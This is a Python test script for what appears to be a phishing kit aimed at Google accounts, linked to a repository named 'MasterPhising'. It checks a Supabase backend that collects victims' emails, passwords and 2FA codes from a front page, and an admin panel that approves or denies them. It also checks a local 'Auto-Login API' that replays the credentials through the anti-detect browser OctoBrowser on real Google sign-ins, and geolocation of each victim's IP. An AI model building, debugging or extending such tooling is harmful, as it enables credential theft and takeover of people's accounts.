#!/usr/bin/env python3
"""
Auto-Login Integration Test Script for NEW PROJECT
Project: otbswtklpidhezziotac
Tests Auto-Login API and new Supabase integration with Country Detection
"""

import requests
import json
import time
from datetime import datetime

# NEW PROJECT CONFIGURATION
AUTO_LOGIN_API_URL = "http://localhost:5000"
SUPABASE_API_URL = "https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api"
PROJECT_NAME = "otbswtklpidhezziotac"

def print_header(title):
    print("\n" + "="*60)
    print(f"  {title}")
    print("="*60)

def print_test(test_name):
    print(f"\n🧪 {test_name}")
    print("-" * 50)

def print_result(success, message, data=None):
    status = "✅ PASS" if success else "❌ FAIL"
    print(f"{status}: {message}")
    if data and isinstance(data, dict):
        print(f"   Data: {json.dumps(data, indent=2)[:200]}...")
    elif data:
        print(f"   Data: {str(data)[:200]}...")

def explain_localhost_architecture():
    """Explain why Auto-Login API runs on localhost"""
    print_header("ARCHITECTURE EXPLANATION")
    print("🏗️  WHY AUTO-LOGIN API RUNS ON LOCALHOST:5000?")
    print()
    print("📋 ARCHITECTURE:")
    print("   Supabase (Cloud) → Auto-Login API (Local) → OctoBrowser (Local) → Real Google")
    print()
    print("💡 REASONS FOR LOCAL:")
    print("   1. 🔌 OctoBrowser connection: Need access to localhost:58888")
    print("   2. 📁 Local files: profiles_pool_v2.json, ultra_fast_login_v2.py")
    print("   3. 🖱️  Selenium automation: Browser control must be local")
    print("   4. 👤 Profile management: Browser profiles stored locally")
    print()
    print("🌐 CLOUD ALTERNATIVE:")
    print("   - Deploy VPS + OctoBrowser on VPS")
    print("   - More complex setup")
    print("   - Higher cost")
    print()
    print("✅ CURRENT SETUP: Simple, reliable, cost-effective")

def test_auto_login_api():
    """Test Auto-Login API endpoints"""
    print_header("AUTO-LOGIN API TESTS")
    
    # Test 1: Health Check
    print_test("Health Check")
    try:
        response = requests.get(f"{AUTO_LOGIN_API_URL}/", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if "AUTO-LOGIN API RUNNING" in data.get("status", ""):
                print_result(True, "API is running", data)
            else:
                print_result(False, "Unexpected response", data)
        else:
            print_result(False, f"HTTP {response.status_code}", response.text)
    except Exception as e:
        print_result(False, f"Connection error: {e}")
        print("💡 TIP: Make sure Auto-Login API is running: python auto_login_api.py")
    
    # Test 2: Email Validation
    print_test("Email Validation")
    test_emails = [
        ("test@gmail.com", True),
        ("newproject@example.com", True),
        ("invalid-email", False),
        ("", False)
    ]
    
    for email, should_pass in test_emails:
        try:
            response = requests.post(
                f"{AUTO_LOGIN_API_URL}/validate-email",
                json={"email": email},
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                success = data.get("success", False)
                action = data.get("action", "")
                
                if should_pass and success and action == "approve":
                    print_result(True, f"Email '{email}' correctly approved")
                elif not should_pass and (not success or action == "deny"):
                    print_result(True, f"Email '{email}' correctly denied")
                else:
                    print_result(False, f"Email '{email}' unexpected result", data)
            else:
                print_result(False, f"HTTP {response.status_code} for '{email}'")
        except Exception as e:
            print_result(False, f"Error testing '{email}': {e}")
    
    # Test 3: 2FA Validation
    print_test("2FA Validation")
    test_2fa_codes = [
        ("123456", True),   # Valid 6-digit
        ("654321", True),   # Another valid 6-digit
        ("12345", False),   # Too short
        ("abcdef", False),  # Not digits
        ("", False)         # Empty
    ]
    
    for code, should_pass in test_2fa_codes:
        try:
            response = requests.post(
                f"{AUTO_LOGIN_API_URL}/handle-2fa",
                json={"email": "test@gmail.com", "twofa": code},
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                success = data.get("success", False)
                action = data.get("action", "")
                
                if should_pass and success and action == "approve":
                    print_result(True, f"2FA code '{code}' correctly approved")
                elif not should_pass and (not success or action == "deny"):
                    print_result(True, f"2FA code '{code}' correctly denied")
                else:
                    print_result(False, f"2FA code '{code}' unexpected result", data)
            else:
                print_result(False, f"HTTP {response.status_code} for '{code}'")
        except Exception as e:
            print_result(False, f"Error testing '{code}': {e}")

def test_new_supabase_integration():
    """Test NEW Supabase project integration"""
    print_header("NEW SUPABASE PROJECT INTEGRATION TESTS")
    print(f"📦 Project: {PROJECT_NAME}")
    print(f"🌐 URL: {SUPABASE_API_URL}")
    
    # Test 1: New Supabase Function Health Check
    print_test("New Supabase Function Health Check")
    try:
        response = requests.get(f"{SUPABASE_API_URL}/", timeout=10)
        if response.status_code == 200:
            data = response.json()
            version = data.get("version", "")
            project = data.get("project", "")
            auto_login = data.get("auto_login_enabled", False)
            country_detection = data.get("country_detection", False)
            
            if "NEW-PROJECT" in version and project == PROJECT_NAME and country_detection:
                print_result(True, "New Supabase function working with country detection", {
                    "version": version,
                    "project": project,
                    "auto_login_enabled": auto_login,
                    "country_detection": country_detection
                })
            else:
                print_result(False, "Function not properly updated", data)
        else:
            print_result(False, f"HTTP {response.status_code}", response.text)
    except Exception as e:
        print_result(False, f"Connection error: {e}")
    
    # Test 2: Database Schema Check
    print_test("Database Schema Check")
    try:
        # Try to get stats (tests if database is properly set up)
        response = requests.get(f"{SUPABASE_API_URL}/api/stats", timeout=10)
        if response.status_code == 200:
            data = response.json()
            print_result(True, "Database schema working", data)
        else:
            print_result(False, f"Database schema error: HTTP {response.status_code}")
    except Exception as e:
        print_result(False, f"Database schema error: {e}")
    
    # Test 3: Email Submission with Auto-Login and Country Detection
    print_test("Email Submission with Auto-Login & Country Detection")
    try:
        test_email = f"countrytest{int(time.time())}@gmail.com"
        test_data = {
            "email": test_email,
            "password": "",
            "twofa": "",
            "userAgent": "Country Detection Test Agent",
            "currentPage": "index.html"
        }
        
        response = requests.post(
            f"{SUPABASE_API_URL}/api/request",
            json=test_data,
            timeout=15
        )
        
        if response.status_code == 200:
            data = response.json()
            request_id = data.get("requestId")
            auto_login = data.get("autoLogin")
            detected_country = data.get("detectedCountry")
            client_ip = data.get("clientIP")
            
            if request_id and auto_login and detected_country:
                print_result(True, f"Request created with Auto-Login and Country Detection", {
                    "requestId": request_id,
                    "autoLogin": auto_login,
                    "detectedCountry": detected_country,
                    "clientIP": client_ip
                })
                
                # Test 4: Check approval status in new project
                print_test("Check Auto-Approval Status with Country Info")
                time.sleep(2)  # Wait for processing
                
                check_response = requests.get(
                    f"{SUPABASE_API_URL}/api/check-approval?email={test_email}",
                    timeout=10
                )
                
                if check_response.status_code == 200:
                    check_data = check_response.json()
                    status = check_data.get("status")
                    
                    if status in ["approved", "denied"]:
                        print_result(True, f"Auto-approval working with country detection: {status}", check_data)
                    else:
                        print_result(False, f"Unexpected status: {status}", check_data)
                else:
                    print_result(False, f"HTTP {check_response.status_code}")
            else:
                print_result(False, "Missing requestId, autoLogin, or country detection", data)
        else:
            print_result(False, f"HTTP {response.status_code}", response.text)
    except Exception as e:
        print_result(False, f"Error testing email submission: {e}")

def test_country_detection_feature():
    """Test country detection specifically"""
    print_header("COUNTRY DETECTION FEATURE TEST")
    
    print_test("Country Detection from IP")
    try:
        # Test with multiple requests to see different countries
        test_cases = [
            f"country1_{int(time.time())}@gmail.com",
            f"country2_{int(time.time())}@gmail.com"
        ]
        
        for email in test_cases:
            test_data = {
                "email": email,
                "password": "",
                "twofa": "",
                "userAgent": "Country Detection Test",
                "currentPage": "index.html"
            }
            
            response = requests.post(
                f"{SUPABASE_API_URL}/api/request",
                json=test_data,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                detected_country = data.get("detectedCountry", "Unknown")
                client_ip = data.get("clientIP", "unknown")
                
                if detected_country == "United States (US)":
                    print_result(True, f"Country: {detected_country} (Fallback or Real US) from IP: {client_ip}")
                elif detected_country != "Unknown":
                    print_result(True, f"Country detected: {detected_country} from IP: {client_ip}")
                else:
                    print_result(True, f"Country detection: {detected_country} (unexpected - should fallback to US)")
            else:
                print_result(False, f"HTTP {response.status_code}")
            
            time.sleep(1)  # Small delay between requests
            
    except Exception as e:
        print_result(False, f"Error testing country detection: {e}")

def test_admin_gui_endpoints():
    """Test Admin GUI endpoints"""
    print_header("ADMIN GUI ENDPOINTS TEST")
    
    # Test 1: Get pending requests
    print_test("Get Pending Requests with Country Info")
    try:
        response = requests.get(f"{SUPABASE_API_URL}/api/pending", timeout=10)
        if response.status_code == 200:
            data = response.json()
            print_result(True, f"Found {len(data)} requests", {"count": len(data)})
            
            # Check if any requests have country info
            if data:
                sample_request = data[0]
                country = sample_request.get("country", "Unknown")
                ip = sample_request.get("ip", "unknown")
                print(f"   📍 Sample request country: {country} from IP: {ip}")
        else:
            print_result(False, f"HTTP {response.status_code}")
    except Exception as e:
        print_result(False, f"Error: {e}")
    
    # Test 2: Get statistics
    print_test("Get Request Statistics")
    try:
        response = requests.get(f"{SUPABASE_API_URL}/api/stats", timeout=10)
        if response.status_code == 200:
            data = response.json()
            print_result(True, "Statistics retrieved", data)
        else:
            print_result(False, f"HTTP {response.status_code}")
    except Exception as e:
        print_result(False, f"Error: {e}")

def main():
    """Main test runner for new project"""
    print_header(f"AUTO-LOGIN INTEGRATION TEST SUITE - NEW PROJECT")
    print(f"🕐 Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"📦 Project: {PROJECT_NAME}")
    print(f"🌐 Auto-Login API: {AUTO_LOGIN_API_URL}")
    print(f"🌐 Supabase API: {SUPABASE_API_URL}")
    print(f"🔗 GitHub: https://github.com/MasterPhising/10musd")
    print(f"🆕 Features: Auto-Login + Country Detection + IP Geolocation")
    
    # Explain architecture first
    explain_localhost_architecture()
    
    # Run tests
    test_auto_login_api()
    test_new_supabase_integration()
    test_country_detection_feature()
    test_admin_gui_endpoints()
    
    print_header("TEST SUMMARY")
    print("🎯 If all tests pass, the NEW PROJECT integration is working correctly!")
    print("🌍 Country detection should show real countries or fallback to 'United States (US)'")
    print("🇺🇸 Fallback strategy: Unknown/Local IPs → United States (US)")
    print("📡 Auto-Login API runs locally to access OctoBrowser")
    print("🔧 If tests fail, check the troubleshooting section in README")
    print("📦 New project prevents breaking the old one")
    print(f"🕐 Completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    print("\n" + "="*60)
    print("  🏗️ ARCHITECTURE SUMMARY")
    print("="*60)
    print("Frontend → Supabase (Cloud) → Auto-Login API (Local) → OctoBrowser (Local)")
    print("✅ Benefits: Simple setup, reliable, cost-effective")
    print("🌍 Country detection: Automatic IP geolocation with US fallback")
    print("🇺🇸 Smart fallback: Local/Unknown IPs → United States (US)")
    print("🤖 Auto approve/deny: Based on real Google login tests")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⏹️ Tests interrupted by user")
    except Exception as e:
        print(f"\n\n💥 Unexpected error: {e}")
        input("Press Enter to exit...") 